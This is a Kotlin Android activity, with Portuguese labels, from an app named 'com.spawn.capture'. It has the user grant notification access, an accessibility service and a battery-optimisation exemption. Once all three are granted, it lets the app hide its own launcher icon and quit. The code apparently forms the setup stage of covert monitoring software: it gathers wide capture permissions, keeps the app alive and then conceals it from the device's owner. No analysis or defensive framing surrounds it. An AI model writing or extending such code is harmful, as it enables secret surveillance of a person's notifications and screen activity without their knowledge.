package com.spawn.capture

import android.accessibilityservice.AccessibilityService
import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.Gravity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView

class MainActivity : Activity() {

    private lateinit var status: TextView
    private lateinit var btnHide: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val pad = (16 * resources.displayMetrics.density).toInt()
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(pad, pad, pad, pad)
            gravity = Gravity.CENTER_VERTICAL
        }
        val title = TextView(this).apply {
            text = getString(R.string.app_name)
            textSize = 20f
        }
        status = TextView(this).apply { textSize = 16f }
        val btnNotif = button("Ativar acesso a notificações") {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }
        val btnA11y = button("Ativar serviço de acessibilidade") {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
        val btnBattery = button("Isentar de otimização de bateria") {
            val intent = Intent(
                Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                Uri.parse("package:$packageName")
            )
            try {
                startActivity(intent)
            } catch (e: Exception) {
                startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
            }
        }
        btnHide = button("Ocultar e finalizar") {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
            finish()
        }
        root.addView(title)
        root.addView(status)
        root.addView(btnNotif)
        root.addView(btnA11y)
        root.addView(btnBattery)
        root.addView(btnHide)
        setContentView(root)
    }

    private fun button(label: String, onClick: () -> Unit) = Button(this).apply {
        text = label
        setOnClickListener { onClick() }
    }

    override fun onResume() {
        super.onResume()
        refresh()
    }

    private fun refresh() {
        val notifOk = notificationAccessEnabled()
        val a11yOk = accessibilityEnabled()
        val batteryOk = (getSystemService(POWER_SERVICE) as PowerManager)
            .isIgnoringBatteryOptimizations(packageName)
        status.text = buildString {
            append(if (notifOk) "[x] " else "[ ] ").append("Notificações\n")
            append(if (a11yOk) "[x] " else "[ ] ").append("Acessibilidade\n")
            append(if (batteryOk) "[x] " else "[ ] ").append("Bateria")
        }
        btnHide.isEnabled = notifOk && a11yOk && batteryOk
    }

    private fun notificationAccessEnabled(): Boolean =
        Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
            ?.contains(packageName) == true

    private fun accessibilityEnabled(): Boolean {
        val enabled = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabled.split(':').any {
            ComponentName.unflattenFromString(it)?.packageName == packageName
        }
    }
}
